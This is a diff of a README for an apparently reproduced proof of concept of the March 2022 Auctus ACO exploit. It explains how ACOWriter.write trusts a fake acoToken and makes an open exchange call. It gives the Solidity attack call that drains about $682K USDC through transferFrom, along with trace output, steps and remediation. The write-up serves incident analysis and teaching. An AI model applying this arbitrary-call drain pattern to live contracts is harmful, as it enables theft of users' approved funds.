@@ -1,6 +1,6 @@
-# Auctus (ACO) Exploit — `ACOWriter` Trusts Attacker-Supplied "Underlying/Strike" Token
+# Auctus (ACO) Exploit — `ACOWriter` Trusts Attacker-Supplied `acoToken` + Arbitrary `exchange` Call
 
-> **Vulnerability classes:** vuln/logic/missing-validation · vuln/dependency/unsafe-external-call
+> **Vulnerability classes:** vuln/logic/missing-validation · vuln/dependency/unsafe-external-call · vuln/access-control/untrusted-input
 
 > **Reproduction:** the PoC compiles & runs in an isolated Foundry project at
 > [this project folder](.). Full verbose trace: [output.txt](output.txt).
@@ -13,104 +13,117 @@
 
 | | |
 |---|---|
-| **Loss** | ~$682K USDC pulled from the ACO protocol's collateral/escrow |
-| **Vulnerable contract** | `ACOWriter` — [`0xE7597F774fD0a15A617894dc39d45A28B97AFa4f`](https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f#code); ERC20Proxy `0x95E6F48254609A6ee006F7D493c8e5fB97094ceF` |
+| **Loss** | ~$682K USDC pulled from the ACO protocol's collateral/escrow holder (`0xCB32…993B`) |
+| **Vulnerable contract** | `ACOWriter` — [`0xE7597F774fD0a15A617894dc39d45A28B97AFa4f`](https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f#code) |
+| **0x ERC20Proxy (legit path)** | `0x95E6F48254609A6ee006F7D493c8e5fB97094ceF` |
 | **Attacker** | this test contract (anyone) |
 | **Chain / block / date** | Ethereum mainnet / 14,460,635 / Mar 2022 |
-| **Bug class** | Trust boundary / missing validation — `ACOWriter.write` accepts an `acoToken` whose `strikeAsset()`/`collateral()` it trusts for value transfers, without verifying the supplied `acoToken` is a genuine ACO option contract. |
+| **Bug class** | Untrusted input + missing validation — `ACOWriter.write` accepts arbitrary `acoToken` (trusts `collateral()`/`strikeAsset()`/`mint*`/`balanceOf`/`approve`/`transfer`) **and** attacker-controlled `exchangeAddress` + raw `exchangeData` for a low-level call. |
 
 ---
 
 ## TL;DR
 
-The PoC passes the **attack contract itself** as the `acoToken` argument to `ACOWriter.write`. The test
-implements the minimal `MockACOToken` interface so that:
+Attacker passes **itself** as `acoToken` (implements minimal `IACOToken` surface):
 
-- `strikeAsset()` returns `address(this)` — claiming the strike asset is the attacker.
-- `collateral()` returns `address(0)`.
-- `mintToPayable()` accepts ETH and returns 1.
-- `balanceOf()`/`transfer()`/`approve()` are stubbed to `true`/`1`.
+- `collateral()` → `address(0)` (takes 1-wei ETH "mint" branch)
+- `strikeAsset()` → `address(this)` (fake strike transfer)
+- All other methods stub success
 
-`ACOWriter.write` ([ACOWriter.sol](sources/ACOWriter_E7597F/ACOWriter.sol)) uses these view/call results
-to decide which token to move and where. Because it trusts the attacker-supplied contract's
-`strikeAsset()`, the writer ends up calling `ERC20Proxy.transferFrom(victimAddress, msg.sender, amount)`
-— pulling **682,255,200,072 USDC** (≈$682K) from a protocol-held address (`0xCB32…993B`) to the
-attacker.
+Call:
 
-The trace shows the decisive call:
-
-```
-FiatTokenProxy::fallback(0xCB32033c498b54818e58270F341e5f6a3bce993B, DefaultSender, 682255200072)
-  → FiatTokenV2_1::transferFrom(0xCB32… → DefaultSender, 682255200072)
-  → emit Transfer(0xCB32… → DefaultSender, 682255200072)
-After exploit, USDC balance of attacker: 682255200072
+```solidity
+acowrite.write{value: 1}(
+    address(this), 1,
+    address(usdc),
+    abi.encodeWithSelector(transferFrom.selector, 0xCB32…993B, msg.sender, usdc.balanceOf(0xCB32…))
+);
 ```
 
-The proxy had (or the ACO system had granted) allowance over that USDC; the writer's blind trust in the
-`acoToken`'s self-described strike/collateral let the attacker redirect a `transferFrom` to themselves.
+In `write` → `_sellACOTokens`:
+
+```solidity
+address _collateral = IACOToken(acoToken).collateral(); // 0
+if (_isEther(_collateral)) { IACOToken(acoToken).mintToPayable{value:1}(msg.sender); }
+
+uint256 acoBalance = _balanceOfERC20(acoToken, address(this));
+_approveERC20(acoToken, erc20proxy, acoBalance);           // on fake
+
+(bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
+// _exchange == USDC → USDC.transferFrom(VICTIM, attacker, 682255200072)
+// executes with msg.sender == ACOWriter (which held allowance)
+
+address token = IACOToken(acoToken).strikeAsset(); // self
+_transferERC20(token, msg.sender, ...);                    // fake
+```
+
+Logs: `After exploit, USDC balance of attacker: 682255200072`
+
+**Note on ERC20Proxy**: Only a harmless `approve(fake, proxy, 1)` touches it. The drain is a direct call to the USDC contract via the unauthenticated exchange path.
 
 ---
 
 ## Root cause
 
-A **trust-the-input defect**: `ACOWriter.write` accepts an arbitrary `acoToken` address and trusts the
-*return values of methods on that address* (`strikeAsset()`, `collateral()`, `underlying()`,
-`mintToPayable()`) to drive real token movements. With no whitelist/genuine-option check, an attacker
-deploys (or, here, *is*) a contract that lies about its strike/collateral, causing the writer to move
-real funds (USDC, via the privileged ERC20Proxy) to an attacker-chosen destination.
+1. No validation that `acoToken` is a genuine ACO deployment. All IACOToken methods are called on attacker-controlled code.
+2. `setExchange` + `_exchange.call{value:...}(exchangeData)` is completely open — intended for 0x sales of minted ACOs but usable for arbitrary actions while the writer context (balances + approvals) is live.
 
-The two-layer issue:
-1. `ACOWriter` never verifies the `acoToken` is a protocol-deployed option.
-2. `ERC20Proxy.transferFrom` is callable with attacker-chosen `from`/`to` once the writer (which the
-   proxy trusts) has been induced to call it.
+Pre-existing user approvals `USDC.approve(ACOWriter, ...)` (required for the legitimate ERC20-collateral `write` path) become the spending authority for the attacker-controlled transferFrom.
+
+---
+
+## Vulnerable Functions (ACOWriter.sol)
+
+```solidity
+function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes memory exchangeData)
+    nonReentrant setExchange(exchangeAddress) public payable
+{
+    require(msg.value > 0 && collateralAmount > 0);
+    address _collateral = IACOToken(acoToken).collateral();
+    if (_isEther(_collateral)) {
+        IACOToken(acoToken).mintToPayable{value: collateralAmount}(msg.sender);
+    } else { /* ERC20 collateral path using caller approvals */ ... }
+    _sellACOTokens(acoToken, exchangeData);
+}
+
+function _sellACOTokens(address acoToken, bytes memory exchangeData) internal {
+    uint256 acoBalance = _balanceOfERC20(acoToken, address(this));
+    _approveERC20(acoToken, erc20proxy, acoBalance);
+    (bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
+    require(success, "...");
+    address token = IACOToken(acoToken).strikeAsset();
+    ... _transferERC20(token, msg.sender, ...) ...
+    if (address(this).balance > 0) msg.sender.transfer(...);
+}
+```
+
+(See full source in `sources/ACOWriter_E7597F/ACOWriter.sol` + `IACOToken.sol`.)
+
+---
+
+## Exploit Steps
+
+1. Attacker contract implements lying `collateral()=0`, `strikeAsset()=self`, success stubs for mint/balance/approve/transfer.
+2. Call `write{value:1}(self, 1, USDC, transferFrom(VICTIM, attacker, amt))`.
+3. Writer follows ETH branch (1 wei), fakes balances/approves, performs the attacker-supplied call (USDC transferFrom succeeds because caller==ACOWriter), fakes strike transfer.
+4. Attacker receives funds.
 
 ---
 
 ## Preconditions
 
-- The ERC20Proxy (or the ACO protocol) holds an allowance/balance of USDC at some address the proxy can
-   move from (`0xCB32…` here).
-- No whitelist on `acoToken`.
-
----
-
-## Diagrams
-
-```mermaid
-flowchart TD
-    A(["attacker: ACOWriter.write(acoToken = attackerContract, …)"]) --> S["writer reads acoToken.strikeAsset() → attacker"]
-    S --> TF["ERC20Proxy.transferFrom(0xCB32… → msg.sender, 682K USDC)<br/>writer trusts proxy; proxy moves real USDC"]
-    TF --> P(["+682,255 USDC to attacker"])
-
-    style TF fill:#ffcdd2,stroke:#c62828,stroke-width:2px
-    style P fill:#c8e6c9,stroke:#2e7d32
-```
-
-```mermaid
-sequenceDiagram
-    autonumber
-    actor A as Attacker (= fake AcoToken)
-    participant W as ACOWriter
-    participant P as ERC20Proxy
-    participant U as USDC
-
-    A->>W: write(acoToken=A, …, value)
-    W->>A: strikeAsset() → A (lie)
-    W->>P: transferFrom(0xCB32… → A, amount)
-    P->>U: transferFrom(...)
-    U-->>A: 682,255,200,072 USDC
-```
+- ACOWriter reachable.
+- Target holder has non-zero USDC balance + prior `approve(ACOWriter, X)`.
+- 1 wei available.
 
 ---
 
 ## Remediation
 
-1. **Whitelist `acoToken`** against a registry of genuine ACO option deployments; revert otherwise.
-2. **Never derive the value-transfer `from`/`to` from attacker-supplied contract return values.** Resolve
-   strike/collateral from the protocol's own configuration.
-3. **Scope the ERC20Proxy**: `transferFrom` should only ever move funds for protocol-internal accounting
-   with a fixed `to` (the protocol), never an arbitrary caller destination.
-4. **Validate `collateral()`/`strikeAsset()` are known, non-zero, distinct tokens** before any movement.
+- Whitelist `acoToken` from official factory.
+- Do not derive token movement targets or perform arbitrary calls from untrusted `acoToken` / `exchange*` inputs.
+- Restrict `exchangeAddress` (or remove raw call) and validate `exchangeData`.
+- Prefer exact-amount approvals or permit flows.
 
 ---
 
@@ -120,9 +133,10 @@ sequenceDiagram
 _shared/run_poc.sh 2022-03-Auctus_exp -vvvvv
 ```
 
-- RPC: mainnet archive (block 14,460,635). Infura mainnet in `foundry.toml`.
-- Result: `[PASS] test()` — `After exploit, USDC balance of attacker: 682255200072` (~$682K).
+Result: `[PASS] test()` + attacker USDC balance = 682255200072.
+
+Full trace in `output.txt`. Also see `test/Auctus.sol` (standalone `AuctusDrain`).
 
 ---
 
-*Reference: Auctus / ACO protocol write-path trust flaw, Mar 2022 (~$682K USDC).*
+*Reference: Auctus ACO ACOWriter untrusted acoToken + exchange call, Mar 2022.*
